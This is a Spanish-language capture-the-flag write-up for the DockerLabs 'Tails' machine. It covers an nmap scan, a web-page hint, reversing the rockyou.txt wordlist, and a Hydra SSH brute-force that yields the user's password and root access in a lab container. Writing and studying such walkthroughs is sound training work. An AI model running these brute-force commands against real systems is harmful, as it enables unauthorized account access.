# 🐳 DockerLabs - Writeup Máquina **Tails**

## 📌 Información General

- **Plataforma:** DockerLabs
- **Sistema Operativo:** Linux
- **Servicios detectados:** SSH (22), HTTP (80)
- **Objetivo:** Obtener acceso root

---

## 🔍 Enumeración

Comenzamos realizando un escaneo de puertos con **nmap**:

```bash
nmap -p- -sS -sCV -n -Pn 172.17.0.2
📊 Resultados relevantes
22/tcp open  ssh
80/tcp open  http
🌐 Análisis del servicio HTTP (Puerto 80)
Accedemos al servicio web desde el navegador:

http://172.17.0.2
La página mostraba únicamente la palabra:

tails
💡 Esto nos da una pista clara:

tails podría ser un usuario del sistema

Hace referencia directa al comando tail, que muestra el final de un archivo

🧠 Preparación del diccionario
Partiendo de la hipótesis del uso de tail, decidimos invertir el diccionario rockyou.txt, probando contraseñas desde el final.

🔄 Invertir el diccionario
tac rockyou.txt > rockyou_inv.txt
🧹 Eliminar espacios en blanco
sed -i 's/ //g' rockyou_inv.txt
Con esto obtenemos un diccionario más limpio y adaptado a la pista encontrada.

🔐 Ataque de Fuerza Bruta a SSH
Utilizamos Hydra para atacar el servicio SSH con el usuario tails:

hydra -l tails -P rockyou_inv.txt ssh://172.17.0.2
✅ Credenciales obtenidas
Usuario: tails
Contraseña: 3117548331
🖥️ Acceso al sistema
Nos conectamos por SSH:

ssh tails@172.17.0.2
Al acceder, comprobamos el usuario actual:

whoami
⚠️ Resultado inesperado
root
🎉 El usuario tails ya pertenece a root, por lo que la escalada de privilegios es total y directa.

👑 Escalada de Privilegios
No fue necesaria ninguna técnica adicional de escalada, ya que:

tails == root

Acceso completo al sistema desde el inicio

🏁 Conclusión
Esta máquina se basa principalmente en:

Enumeración correcta

Interpretación de pistas

Pensamiento lógico sobre el uso de diccionarios

Ataques adaptados al contexto

Un excelente ejercicio para reforzar la importancia de no ignorar detalles simples en aplicaciones web.

🧠 Lecciones Aprendidas
Siempre analizar el contenido web, aunque parezca trivial

Adaptar diccionarios según las pistas encontradas

Verificar privilegios inmediatamente tras acceder


Plataforma: DockerLabs.es
